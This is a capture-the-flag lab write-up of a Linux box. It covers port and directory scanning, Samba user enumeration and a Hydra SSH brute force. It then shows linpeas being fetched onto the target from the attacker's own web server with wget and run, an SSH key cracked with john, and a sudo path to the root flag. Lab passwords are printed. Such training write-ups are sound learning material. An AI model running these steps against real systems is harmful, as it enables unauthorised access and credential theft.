
# Scanning

As always, we start off the box by scanning the ports with NMAP. I always start with the default scripts on with -sC and enumerating the versions with -sV, then storing the results in a folder if I need to revisit the output in a later stage. So I start off with the following command:
`sudo nmap -sC -sV -oA /nmap 10.10.125.236`
We get the following output from NMAP:
![Image](./attachments/Pasted_image 20231212094215.png)

So we have the following ports:
22 : SSH
80 : HTTP
129 : Samba
445 : Samba
8009: some aj13 port
8080 : HTTP

Lets see what we can find for the HTTP ports that we have found. 

There are quite some different enumeration tools, I am now using both dirbuster and feroxbuster most of the times and looking for a one to continue with. Below the results of both. What I like about feroxbuster is that when it finds a new directory, it goes and enumerate that directory as well, saving lot's of time and removing the possibility of me missing something. I do like the clear overview of the normal dirbuster, but perhaps I need to do some tweaking on the feroxbuster tool and get more familiar with it.

Results for Gobuster with the addition of the php and txt extensions:
`gobuster dir -u http://10.10.108.92 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt`

![Image](./attachments/Pasted_image 20240125090405.png)
Now I need to retrigger on the found directory. But we have scanned it with feroxbuster below, so no more need.

Feroxbuster results:
`feroxbuster -u http://10.10.108.92 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404`
![Image](./attachments/Pasted_image 20240125090605.png)

When my enumeration tools are running, I like to have a look on the web page and click around, view the source code and look for other hints. In the source code we can actually find a hint to look at the 'our dev note section'.
![Image](./attachments/Pasted_image 20231212093756.png)

From our enumeration, we get the /development page and find the following files in the folder.
![Image](./attachments/Pasted_image 20231212094000.png)
The dev text file gives us the following info:
![Image](./attachments/Pasted_image 20231212094125.png)

This means that there are 2 dev users, -K and -J who are working on the server. They have used a version 2.5.12, we can have a look whether that is vulnerable.

Then there is the second file, j.txt:
![Image](./attachments/Pasted_image 20231212094248.png)
Here we can see that -J has a weak password in the /etc/shadow folder. We will most likely have to fetch this somehow.

Now we saw that we also have some Samba ports open, so we can start looking what we can find there. I use enum4linux for this, which will enumerate all the information I need.
`enum4linux 10.10.108.92`

From this scan, we find on our server that we have 2 users:
![Image](./attachments/Pasted_image 20231212105325.png)

So now that we have the usernames Kay and Jay, we know that Kay has been leaving notes to Jay about his weak password. Knowing this, we can try to use Hydra to bruteforce into the SSH with Jan's weak credentials and see if we can get in! Here I use the rockyou.txt wordlist, as this list is huge and widely used in the field. Normally I first try to use a list for some quick hits, with the /usr/share/wordlists/seclists/Passwords/2020.200_most_used_passwords.txt wordlist. If that doesn't get anything, I go to rockyou.txt.
`hydra -l jan -P rockyou.txt 10.10.0.61 -t 6 ssh`
![Image](./attachments/Pasted_image 20231212133846.png)

This worked! So now we have the SSH login:
username: jan
password: armando

# PrivEsc

Now that we have access, let's see what we can do on the SSH server. I always check the current directory, what other directories there are in the home folder to find other users and see if we can access files there. Then I like to run the sudo -l  command, if I have the password for the user, to see if we have any sudo commands we can run.
This yielded in finding a password backup file in Kay's directory, but we can't access this as the Jan user.

My next step is to use an enumeration tool to find all the weak spots in the system and see if we can exploit anything with that info. I find Linpeas very easy to use, which I from my local machine by hosten a python webserver in the folder with the bash script with: 
`python3 -m http.server`

Then on the box, I can go to the /tmp folder, where we are allowed to bring new files and get the file with:
`wget 10.10.10.10:8080/linpeas.sh`

Then I make the file executable with:
`chmod +x linpeas.sh`

And then I can run the script! It found some interesting things:
![Image](./attachments/Pasted_image 20231212134716.png)
![Image](./attachments/Pasted_image 20231212134829.png)![Image](./attachments/Pasted_image 20231212134926.png)

Lets see what we can do with the non pub id_rsa from kay. I just opened it on the box and copied the content into a new file on my local machine. Then I was able to ssh2john the key into a hash and use john to hashcrack it into a password!
![Image](./attachments/Pasted_image 20231220120126.png)

I can now login (after upgrading the permissions of the id_rsa file with chmod 600 id_rsa) and the retrieved password form the hash. 
We are now in!
![Image](./attachments/Pasted_image 20231220120748.png)

We see now that there is a backup file of the password
`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`. I first tried to see if I can switch to the root user with the password, but that didn't work. Then I figured, we can maybe use this for the kay or jan user, to run sudo commands. After trying it we see that we can use sudo for everything for the Kay user, so we can try to use cat to show the root flag with 
`sudo cat /root/flag.txt`
And we get the following:
![Image](./attachments/Pasted_image 20240125094038.png)

And thus finishing this box!


